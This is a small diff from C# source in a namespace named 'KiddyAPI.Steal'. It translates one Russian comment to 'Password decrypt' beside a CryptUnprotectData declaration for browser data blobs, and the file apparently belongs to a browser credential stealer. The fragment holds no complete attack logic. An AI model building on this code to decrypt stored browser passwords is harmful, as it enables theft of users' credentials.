@@ -16,7 +16,7 @@ namespace KiddyAPI.Steal
         
         private static extern bool CryptUnprotectData(ref Browsers.DataBlob pCipherText, ref string pszDescription, ref Browsers.DataBlob pEntropy, IntPtr pReserved, ref Browsers.CryptprotectPromptstruct pPrompt, int dwFlags, ref Browsers.DataBlob pPlainText);
         /// <summary>
-        /// Расшифровка паролей
+        /// Password decrypt
         /// </summary>
         /// <param name="cipherTextBytes">Password from DB</param>
         /// <param name="entropyBytes">(null)</param>
